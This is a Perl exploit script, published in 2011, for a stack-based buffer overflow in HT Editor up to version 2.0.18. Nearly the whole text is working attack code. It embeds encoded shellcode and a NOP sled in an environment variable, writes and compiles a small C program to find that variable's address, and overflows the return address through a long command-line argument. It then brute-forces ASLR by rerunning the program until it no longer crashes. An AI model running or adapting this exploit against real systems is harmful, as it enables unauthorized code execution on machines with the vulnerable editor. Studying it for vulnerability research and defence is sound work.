# Exploit Title: HT Editor File openning Stack Overflow (0day)
# Date: March 30th 2011
# Author: ZadYree
# Software Link: http://hte.sourceforge.net/downloads.html
# Version: <= 2.0.18
# Tested on: Linux/Windows (buffer padding may differ on W32)
# CVE : None

#!/usr/bin/perl
=head1 TITLE

HT Editor <=2.0.18 0day Stack-Based Overflow Exploit


=head2 SYNOPSIS

	my $payload = ["hte", ("A" x (4108 - length(qx{pwd}))) . reverse(pack('H*', $retaddr))];


=head1 DESCRIPTION

The vulnerability is triggered by a too large argument (+ path) which simply lets you overwrite eip.

=head2 AUTHOR

ZadYree ~ 3LRVS Team


=head3 SEE ALSO

ZadYree's blog: z4d.tuxfamily.org

3LRVS blog: 3lrvs.tuxfamily.org

Shellcode based on http://www.shell-storm.org/shellcode/files/shellcode-606.php => Thanks 
=cut

use strict;
use warnings;

use constant SHELLCODE => 	"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e".
				"\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8" .
				"\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67" .
				"\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30" .
				"\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4" .
				"\x53\x52\x54\x8a\xe2\xce\x81";

use constant NOPZ => ("\x90" x 3000);

$ENV{'TAPZCODE'} = (NOPZ . SHELLCODE);

open(my $fh, ">", "g3tenv.c");
print $fh <<"EOF";
#include <stdio.h>
void main() {
	printf("%x", getenv("TAPZCODE"));
}
EOF
system("gcc g3tenv.c -o g3tenv");
my $retaddr = qx{./g3tenv};

my $payload = ["hte", ("A" x (4108 - length(qx{pwd}))) . reverse(pack('H*', $retaddr))];

open(my $as, "<", "/proc/sys/kernel/randomize_va_space");
my $status = <$as>;
close($as);
unless ($status != 0) {
	unlink("g3tenv.c", "g3tenv");
	exec(@$payload);
}
print "[*]ASLR detected!\012";
print "[*]Bruteforcing ASLR...\012";
while (1) {
	$payload = ["hte", ("A" x (4108 - length(qx{pwd}))) . reverse(pack('H*', $retaddr))];
	qx{@$payload};
	last unless ($? == 11);
}
unlink("g3tenv.c", "g3tenv");
die "HAPPY Hacking!";
